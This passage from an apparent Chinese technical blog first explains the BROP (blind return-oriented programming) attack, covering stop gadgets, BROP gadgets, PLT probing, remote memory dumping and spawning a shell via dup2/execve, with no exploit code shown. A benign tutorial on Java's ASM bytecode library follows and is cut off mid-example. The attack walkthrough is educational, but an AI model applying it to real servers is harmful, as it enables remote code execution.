<h3 id="寻找stop-gadget"><a href="#寻找stop-gadget" class="headerlink" title="寻找stop gadget"></a>寻找stop gadget</h3><p>已经找到攻破stack canary的方法，下一个目标是找到前面说的4个gadget。<br>在寻找这些特定的gadgets之前，我们需要先来介绍一种特殊的gadget类型：<code>stop gadget</code>。<br>一般情况下，如果我们把栈上的<code>return address</code>覆盖成某些我们随意选取的内存地址的话，程序有很大可能性会挂掉（比如，该return address指向了一段代码区域，里面会有一些对空指针的访问造成程序crash，从而使得攻击者的连接（connection）被关闭）。但是，存在另外一种情况，即该<code>return address</code>指向了一块代码区域，当程序的执行流跳到那段区域之后，程序并不会crash，而是进入了无限循环，这时程序仅仅是hang在了那里，攻击者能够一直保持连接状态。于是，我们把这种类型的gadget，称为<code>stop gadget</code>，这种gadget对于寻找其他gadgets取到了至关重要的作用。</p>
<h3 id="寻找可利用的（potentially-useful）gadgets"><a href="#寻找可利用的（potentially-useful）gadgets" class="headerlink" title="寻找可利用的（potentially useful）gadgets"></a>寻找可利用的（potentially useful）gadgets</h3><p>假设已经找到可以使程序保持连接的stop gadget（比如一个无限循环或某个blocking的系统调用），下面寻找可以利用的gadget。<br>到目前为止，还只能对栈进行操作，只能通过覆盖<code>return address</code>进行后续操作。假设已经猜到某个<code>useful gadget</code>，比如<code>pop rdi; ret</code>，但是由于在执行完这个gadget之后进程还会跳到栈上的下一个地址，如果该地址是一个非法地址，那么进程最后还是会crash，在这个过程中攻击者其实并不知道这个<code>useful gadget</code>被执行过了（因为在攻击者看来最后的效果都是进程crash了），因此攻击者就会认为在这个过程中并没有执行到任何的<code>useful gadget</code>，从而放弃它，这个步骤如下图所示：<br><img src="/images/brop/nostopgadget.jpg"><br>但是，如果我们有了<code>stop gadget</code>，那么整个过程将会很不一样. 如果我们在需要尝试的<code>return address</code>之后填上了足够多的<code>stop gadget</code>，如下图所示：<br><img src="/images/brop/stopgadget.jpg"><br>那么任何会造成进程crash的gadget最后还是会造成进程crash，而那些<code>useful gadget</code>则会进入block状态。尽管如此，还是有一种特殊情况，即那个我们需要尝试的gadget也是一个<code>stop gadget</code>，那么如上所述，它也会被我们标识为<code>useful gadget</code>。不过这并没有关系，因为之后我们还是需要检查该<code>useful gadget</code>是否是我们想要的gadget。</p>
<h3 id="远程dump内存"><a href="#远程dump内存" class="headerlink" title="远程dump内存"></a>远程dump内存</h3><p>到目前为止，似乎准备工作都做好了，我们已经可以绕过canary防护，并且得到很多不会造成进程crash的<code>potential useful gadget</code>了，那么接下来就是该如何找到我们之前所提到的那四个gadgets呢？<br><img src="/images/brop/fourgadget.jpg"><br>如上图所示，为了找到前两个gadgets：<code>pop rsi; ret</code>和<code>pop rdi; ret</code>，我们只需要找到一种所谓的<code>BROP gadget</code>就可以了，这种gadget很常见，它做的事情就是恢复那些<code>callee saved registers</code>。 而对它进行一个偏移就能够生成<code>pop rdi</code>和<code>pop rsi</code>这两个gadgets。<br><code>pop rdx; ret</code>这个gadget并不容易找到，它很少出现在代码里，相比于寻找<code>pop rdx</code>，可以利用<code>strcmp</code>这个函数调用，该函数调用会把字符串的长度赋值给<code>rdx</code>，从而达到相同的效果。另外<code>strcmp</code>和<code>write</code>调用都可以在程序的Procedure Linking Table(PLT)里面找到。<br>接下来的任务：</p>
<ul>
<li>找到所谓的<code>BROP gadget</code>；</li>
<li>找到对应的PLT项。</li>
</ul>
<h3 id="寻找BROP-gadget"><a href="#寻找BROP-gadget" class="headerlink" title="寻找BROP gadget"></a>寻找BROP gadget</h3><p>事实上<code>BROP gadget</code>很特殊，因为它需要顺序地从栈上<code>pop</code>6个值，然后执行<code>ret</code>。所以如果我们利用之前提到的<code>stop gadget</code>的方法就可以很容易找到这种特殊的gadget了，我们只需要在<code>stop gadget</code>之前填上6个会造成crash的地址:<br><img src="/images/brop/bropgadget.jpg"><br>如果任何<code>useful gadget</code>满足这个条件且不会crash的话，那么它基本上就是<code>BROP gadget</code>了。</p>
<h3 id="寻找PLT项"><a href="#寻找PLT项" class="headerlink" title="寻找PLT项"></a>寻找PLT项</h3><p>PLT是一个跳转表，它的位置一般在可执行程序开始的地方，该机制主要被用来给应用程序调用外部函数（比如libc等）。它有一个非常独特的特点：每一个项都是16个字节对齐，其中第0个字节开始的地址指向该项对应函数的<code>fast path</code>，而第6个字节开始的地址指向了该项对应函数的<code>slow path</code>：<br><img src="/images/brop/plt.jpg"><br>另外，大部分的PLT项都不会因为传进来的参数的原因crash，因为它们很多都是系统调用，都会对参数进行检查，如果有错误会返回<code>EFAULT</code>而已，并不会造成进程crash。所以攻击者可以通过下面这个方法找到PLT：如果攻击者发现好多条连续的16个字节对齐的地址都不会造成进程crash，而且这些地址加6得到的地址也不会造成进程crash，那么很有可能这就是某个PLT对应的项了。<br>那么当我们得到某个PLT项，我们该如何判断它是否是<code>strcmp</code>或者<code>write</code>呢？<br>对于<code>strcmp</code>来说, 方法是对其传入不同的参数组合，通过该方法调用返回的结果来进行判断。由于<code>BROP gadget</code>的存在，我们可以很方便地控制前两个参数，strcmp会发生如下的可能性：</p>
<table>
<thead>
<tr>
<th align="center">arg1</th>
<th align="center">arg2</th>
<th align="center">result</th>
</tr>
</thead>
<tbody><tr>
<td align="center">readable</td>
<td align="center">0x0</td>
<td align="center">crash</td>
</tr>
<tr>
<td align="center">0x0</td>
<td align="center">readable</td>
<td align="center">crash</td>
</tr>
<tr>
<td align="center">0x0</td>
<td align="center">0x0</td>
<td align="center">crash</td>
</tr>
<tr>
<td align="center">readable</td>
<td align="center">readable</td>
<td align="center">nocrash</td>
</tr>
</tbody></table>
<p>根据这个signature，我们能够在很大可能性上找到<code>strcmp</code>对应的PLT项。<br>而对于<code>write</code>调用，虽然它没有这种类似的signature，但是我们可以通过检查所有的PLT项，然后触发其向某个socket写数据来检查<code>write</code>是否被调用了，如果<code>write</code>被调用了，那么我们就可以在本地看到传过来的内容了。<br>最后一步就是如何确定传给<code>write</code>的socket文件描述符是多少了。这里有两种办法：1. 同时调用好几次<code>write</code>，把它们串起来，然后传入不同的文件描述符数；2. 同时打开多个连接，然后使用一个相对较大的文件描述符数字，增加匹配的可能性。<br>到这一步为止，攻击者就能够将整个<code>.text</code>段从内存中通过socket写到本地来了，然后就可以对其进行反编译，找到其他更多的gadgets，同时，攻击者还可以dump那些symbol table之类的信息，找到PLT中其它对应的函数项如<code>dup2</code>和<code>execve</code>等。</p>
<h2 id="BROP的攻击流程2-实施攻击"><a href="#BROP的攻击流程2-实施攻击" class="headerlink" title="BROP的攻击流程2 - 实施攻击"></a>BROP的攻击流程2 - 实施攻击</h2><p>到目前为止，最具挑战性的部分已经被解决了，我们已经可以得到被攻击进程的整个内存空间了，接下来就是按部就班了：</p>
<ul>
<li>将socket重定向到标准输入/输出（standard input/output）。攻击者可以使用<code>dup2</code>和<code>close</code>，跟上<code>dup</code>或者<code>fcntl(F_DUPFD)</code>。这些一般都能在PLT里面找到。</li>
<li>在内存中找到<code>/bin/sh</code>。其中一个有效的方法是从<code>symbol table</code>里面找到一个可写区域（writable memory region），比如environ，然后通过socket将<code>/bin/sh</code>从攻击者这里读过去。</li>
<li>execve shell. 如果execve不在PLT上, 那么攻击者就需要通过更多次的尝试来找到一个<code>pop rax; ret</code>和<code>syscall</code>的gadget。</li>
</ul>
<p>归纳起来，BROP攻击的整个步骤是这样的：</p>
<ul>
<li>通过一个已知的stack overflow的漏洞，并通过stack reading的方式绕过stack canary的防护，试出某个可用的return address；</li>
<li>寻找stop gadget：一般情况下这会是一个在PLT中的blocking系统调用的地址（sleep等），在这一步中，攻击者也可以找到PLT的合法项；</li>
<li>寻找BROP gadget：这一步之后攻击者就能够控制write系统调用的前两个参数了；</li>
<li>通过signature的方式寻找到PLT上的strcmp项，然后通过控制字符串的长度来给%rdx赋值，这一步之后攻击者就能够控制write系统调用的第三个参数了；</li>
<li>寻找PLT中的write项：这一步之后攻击者就能够将整个内存从远端dump到本地，用于寻找更多的gadgets；</li>
<li>有了以上的信息之后，就可以创建一个shellcode来实施攻击了。</li>
</ul>
<p>以上就是BROP攻击的原理，后面会找一些实例来实现这个攻击。<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://ytliu.info/blog/2014/05/31/blind-return-oriented-programming-brop-attack-yi/">http://ytliu.info/blog/2014/05/31/blind-return-oriented-programming-brop-attack-yi/</a><br><a target="_blank" rel="noopener" href="http://wooyun.tangscan.cn/static/drops/tips-3071.html">http://wooyun.tangscan.cn/static/drops/tips-3071.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/02/13/Blind-Return-Oriented-Programming-BROP-Attack%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86/" data-id="ckhe7o4kf000qchl7bh17gqot" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-JAVA-ASM字节码框架" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/02/07/JAVA-ASM%E5%AD%97%E8%8A%82%E7%A0%81%E6%A1%86%E6%9E%B6/" class="article-date">
  <time datetime="2017-02-07T03:30:39.000Z" itemprop="datePublished">2017-02-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/07/JAVA-ASM%E5%AD%97%E8%8A%82%E7%A0%81%E6%A1%86%E6%9E%B6/">JAVA ASM字节码框架</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><a target="_blank" rel="noopener" href="http://asm.ow2.org/">ASM</a>是一款基于JAVA字节码层面的代码分析和修改工具；无需提供源代码即可对应用增添所需的Debug代码。用于应用API性能分析，代码优化和代码混淆等工作。ASM的目标是生成，转换和分析已编译的JAVA class文件，可使用ASM工具读、写、转换JVM指令集。<br>ASM工具提供两种方式来产生和转换已编译的class文件：</p>
<ul>
<li><code>基于事件的表示模型</code>使用一个有序的事件序列表示一个class文件，class文件中的每一个元素使用一个事件来表示，比如class的头部，变量，方法声明，JVM指令都有相对应的事件表示，ASM使用自带的事件解析器能将每一个class文件解析成一个事件序列。</li>
<li><code>基于对象的表示模型</code>则使用对象树结构来解析每一个class文件。</li>
</ul>
<p>基于事件模型的ASM工具使用<code>生产者－消费者</code>模型转换／产生一个class文件。其转换过程中涉及到<code>自定义的事件生产者</code>，<code>自定义的事件过滤器</code>和<code>自定义的事件消费者</code>这三种组件。其中使用<code>ClassReader</code>来解析每一个class文件中的事件元素；使用自定义的各种基于方法／变量／声明／类注释的<code>元素适配器</code>来过滤和修改class事件元序列中的相应事件对象；最后使用<code>ClassWriter</code>来重新将更新后的class事件序列转换成class字节码供JVM加载执行。整个生产／转换class文件的过程如下图所示，起点和终点分别是ClassReader（class文件解析器）和ClassWriter（class事件序列转换到class字节码），中间的过程由若干个自定义的事件过滤器组成。<br><img src="/images/javaasm/chain.png"></p>
<h3 id="class文件的结构"><a href="#class文件的结构" class="headerlink" title="class文件的结构"></a>class文件的结构</h3><p>class文件保持固定的结构信息，而且保留了几乎所有的源代码文件中的符号。一个class文件整体结构由几个区域组成，一个区域用来描述类的modifier，name，父类，接口和注释。一个区域用来描述类中变量的modfier，名字，类型和注释。一个区域用来描述类中方法和构造函数的modifier，名字参数类型，返回类型，注释等信息，当然也包含已编译成java字节码指令序列的方法具体内容。还有一个作为class文件的静态池区域，用来保存所有的数字，字符串，类型的常量，这些常量只被定义过一次且被其他class中区域所引用。class文件与源代码文件的关系：一个java文件最后会被编译成N（1 &lt;= N）个class文件。<br>下表展示了一个class文件的总体概貌：</p>
<table>
<tr>
<td colspan="2">Modifiers, name, super class, interfaces</td>
</tr>
<tr>
<td colspan="2">Constant pool: numeric, string and type constants</td>
</tr>
<tr>
<td colspan="2">Source file name(optional)</td>
</tr>
<tr>
<td colspan="2">Enclosing class reference</td>
</tr>
<tr>
<td colspan="2">Annotation*</td>
</tr>
<tr>
<td colspan="2">Attribute*</td>
</tr>
<tr>
<td>Inner class*</td>
<td>Name</td>
</tr>
<tr>
<td rowspan="3">Field*</td>
<td>Modifiers, name, type</td>
</tr>
<tr>
<td>Annotation*</td>
</tr>
<tr>
<td>Attribute*</td>
</tr>
<tr>
<td rowspan="4">Method*</td>
<td>Modifiers, name, return and parameter types</td>
</tr>
<tr>
<td>Annotation*</td>
</tr>
<tr>
<td>Attribute*</td>
</tr>
<tr>
<td>Compiled code</td>
</tr>
</table>

<h3 id="class文件的内部命名"><a href="#class文件的内部命名" class="headerlink" title="class文件的内部命名"></a>class文件的内部命名</h3><p>原Java类型与class文件内部类型对应关系：</p>
<table>
<tr>
<th>Java type</th>
<th>Type descriptor</th>
</tr>
<tr>
<td>boolean</td>
<td>Z</td>
</tr>
<tr>
<td>char</td>
<td>C</td>
</tr>
</tr>
<tr>
<td>byte</td>
<td>B</td>
</tr>
</tr>
<tr>
<td>short</td>
<td>S</td>
</tr>
</tr>
<tr>
<td>int</td>
<td>I</td>
</tr>
</tr>
<tr>
<td>float</td>
<td>F</td>
</tr>
</tr>
<tr>
<td>long</td>
<td>J</td>
</tr>
</tr>
<tr>
<td>double</td>
<td>D</td>
</tr>
</tr>
<tr>
<td>Object</td>
<td>Ljava/lang/Object;</td>
</tr>
</tr>
<tr>
<td>int[]</td>
<td>[I</td>
</tr>
</tr>
<tr>
<td>Object[][]</td>
<td>[[Ljava/lang/Object;</td>
</tr>
</table>

<p>原Java方法声明与class文件内部方法声明的对应关系：</p>
<table>
</tr>
<tr>
<th>Method declaration in source file</th>
<th>Method descriptor</th>
</tr>
</tr>
<tr>
<td>void m(int i, float f)</td>
<td>(IF)V</td>
</tr>
</tr>
<tr>
<td>int m(Object o)</td>
<td>(Ljava/langObject;)I</td>
</tr>
</tr>
<tr>
<td>int[] m(int i, String s)</td>
<td>(ILjava/lang/String;)[I</td>
</tr>
</tr>
<tr>
<td>Object m(int [] i)</td>
<td>([I)Ljava/lang/Object;</td>
</tr>
</table>

<h3 id="ASM工具的接口和组件"><a href="#ASM工具的接口和组件" class="headerlink" title="ASM工具的接口和组件"></a>ASM工具的接口和组件</h3><p>ASM工具生产和转换class文件内容的所有工作都是基于<code>ClassVisitor</code>这个抽象类进行的。ClassVisitor抽象类中的每一个方法会对应到class文件的相应区域，每个方法负责处理class文件相应区域的字节码内容。  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassVisitor</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ClassVisitor</span><span class="params">(<span class="keyword">int</span> api)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ClassVisitor</span><span class="params">(<span class="keyword">int</span> api, ClassVisitor cv)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">(<span class="keyword">int</span> version, <span class="keyword">int</span> access, String name, String signture, String superName, String[] interfaces)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitSource</span><span class="params">(String source, String debug)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitOuterClass</span><span class="params">(String owner, String name, String desc)</span></span>;</span><br><span class="line">    <span class="function">AnnotationVisitor <span class="title">visitAnnotation</span><span class="params">(String desc, <span class="keyword">boolean</span> visible)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitAttribute</span><span class="params">(Attribute attr)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitInnerClass</span><span class="params">(String name, String outerName, String innerName, <span class="keyword">int</span> access)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> FieldVisitor <span class="title">visitField</span><span class="params">(<span class="keyword">int</span> access, String name, String desc, String signature, Object value)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> access, String name, String desc, String signature, String[] exceptions)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">visitEnd</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>某些区域方法直接完成该区域字节码内容的处理并返回空，某些复杂class区域的方法需返回更加细节的XXXVisitor对象，此XXXVisitor对象将负责处理此class区域的更加细节的字节码内容，开发者可以编写继承自XXXVisitor抽象类的自定义类，在成员函数中实现对细节字节码操作的逻辑代码。比如，visitField方法用来负责class文件中变量区域的字节码内容修改，该区域又可细分出多种属性数据对象（注释，参数值），这里需要编写继承自FieldVisitor抽象类的自定义类完成这些细分数据对象的字节码内容操作。  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">FieldVisitor</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FieldVisitor</span><span class="params">(<span class="keyword">int</span> api)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FieldVisitor</span><span class="params">(<span class="keyword">int</span> api, FieldVisitor fv)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> AnnotationVisitor <span class="title">visitAnnotation</span><span class="params">(String desc, <span class="keyword">boolean</span> visible)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitAttribute</span><span class="params">(Attribute attr)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitEnd</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>基于ClassVistor API的访问方式，ASM工具提供了三种核心组件用来实现class的产生和转换工作。<code>ClassReader</code>负责解析class文件字节码数组，然后将相应区域的内容对象传递给<code>ClassVisitor</code>实例中相应的visitXXX方法，ClassReader可以看作是一个事件生产者。<code>ClassWriter</code>继承自ClassVistor抽象类，负责将对象化的class文件内容重构成一个二进制格式的class字节码文件，ClassWriter可以看作是一个事件消费者。继承自ClassVistor抽象类的自定义类负责class文件各个区域内容的修改和生成，它可以看作是一个事件过滤器，一次生产消费过程中这样的事件过滤器可以有N个（0&lt;=N）。</p>
<h3 id="遍历class字节码类信息"><a href="#遍历class字节码类信息" class="headerlink" title="遍历class字节码类信息"></a>遍历class字节码类信息</h3><p>下面的例子用来打印class字节码内容，这里以java.lang.runnable为例。<br>ClassPrinter.java  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.objectweb.asm.FieldVisitor;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> javax.print.attribute.Attribute;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.AnnotationVisitor;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassReader;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassVisitor;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.Opcodes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassPrinter</span> <span class="keyword">extends</span> <span class="title">ClassVisitor</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ClassPrinter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(Opcodes.ASM5);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">(<span class="keyword">int</span> version, <span class="keyword">int</span> access, String name, String signature, </span></span></span><br><span class="line"><span class="function"><span class="params">            String superName, String[] interfaces)</span> </span>&#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot; extends &quot;</span> + superName + <span class="string">&quot; &#123;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitSource</span><span class="params">(String source, String debug)</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitOuterClass</span><span class="params">(String owner, String name, String desc)</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> AnnotationVisitor <span class="title">visitAnnotation</span><span class="params">(String desc, <span class="keyword">boolean</span> visible)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitAttribute</span><span class="params">(Attribute attr)</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitInnerClass</span><span class="params">(String name, String outerName, String innerName, <span class="keyword">int</span> access)</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> FieldVisitor <span class="title">visitField</span><span class="params">(<span class="keyword">int</span> access, String name, String desc, String signature, Object value)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;    &quot;</span> + desc + <span class="string">&quot; &quot;</span> + name);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> access, String name, String desc, String signature, String[] exceptions)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot; &quot;</span> + name + desc);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitEnd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// ClassReader作为字节码生产者，ClassPrinter作为字节码消费者</span></span><br><span class="line">        ClassPrinter cp = <span class="keyword">new</span> ClassPrinter();</span><br><span class="line">        ClassReader cr = <span class="keyword">new</span> ClassReader(<span class="string">&quot;java.lang.Runnable&quot;</span>);</span><br><span class="line">        cr.accept(cp, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java&#x2F;lang&#x2F;Runnable extends java&#x2F;lang&#x2F;Object &#123;</span><br><span class="line"> run()V</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="产生自定义类对应的class字节码"><a href="#产生自定义类对应的class字节码" class="headerlink" title="产生自定义类对应的class字节码"></a>产生自定义类对应的class字节码</h3><p>需要产生如下接口的字节码：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">package pkg;</span><br><span class="line">public interface Comparable extends Mesurable &#123;</span><br><span class="line">    int LESS &#x3D; -1;</span><br><span class="line">    int EQUAL &#x3D; 0;</span><br><span class="line">    int GREATER &#x3D; 1;</span><br><span class="line">    int compareTo(Object o);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所需代码如下：<br>ClassGenerator.java  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.Opcodes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassGenerator</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// 生成一个类只需要ClassWriter组件即可</span></span><br><span class="line">        ClassWriter cw = <span class="keyword">new</span> ClassWriter(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 通过visit方法确定类的头部信息</span></span><br><span class="line">        cw.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC+Opcodes.ACC_ABSTRACT+Opcodes.ACC_INTERFACE,</span><br><span class="line">                <span class="string">&quot;com/asm5/Comparable&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;java/lang/Object&quot;</span>, <span class="keyword">new</span> String[] &#123;<span class="string">&quot;com/asm5/Mesurable&quot;</span>&#125;);</span><br><span class="line">        <span class="comment">// 定义类的属性</span></span><br><span class="line">        cw.visitField(Opcodes.ACC_PUBLIC+Opcodes.ACC_FINAL+Opcodes.ACC_STATIC, <span class="string">&quot;LESS&quot;</span>, <span class="string">&quot;I&quot;</span>,</span><br><span class="line">                <span class="keyword">null</span>, <span class="keyword">new</span> Integer(-<span class="number">1</span>)).visitEnd();</span><br><span class="line">        cw.visitField(Opcodes.ACC_PUBLIC+Opcodes.ACC_FINAL+Opcodes.ACC_STATIC, <span class="string">&quot;EQUAL&quot;</span>, <span class="string">&quot;I&quot;</span>,</span><br><span class="line">                <span class="keyword">null</span>, <span class="keyword">new</span> Integer(<span class="number">0</span>)).visitEnd();</span><br><span class="line">        cw.visitField(Opcodes.ACC_PUBLIC+Opcodes.ACC_FINAL+Opcodes.ACC_STATIC, <span class="string">&quot;GREATER&quot;</span>, <span class="string">&quot;I&quot;</span>,</span><br><span class="line">                <span class="keyword">null</span>, <span class="keyword">new</span> Integer(<span class="number">1</span>)).visitEnd();</span><br><span class="line">        <span class="comment">// 定义类的方法</span></span><br><span class="line">        cw.visitMethod(Opcodes.ACC_PUBLIC+Opcodes.ACC_ABSTRACT, <span class="string">&quot;compareTo&quot;</span>, <span class="string">&quot;(Ljava/lang/Object;)I&quot;</span>,</span><br><span class="line">                <span class="keyword">null</span>, <span class="keyword">null</span>).visitEnd();</span><br><span class="line">        cw.visitEnd(); <span class="comment">// 使cw类已经完成</span></span><br><span class="line">        <span class="comment">// 将cw转换成字节数组写到文件里面去</span></span><br><span class="line">        <span 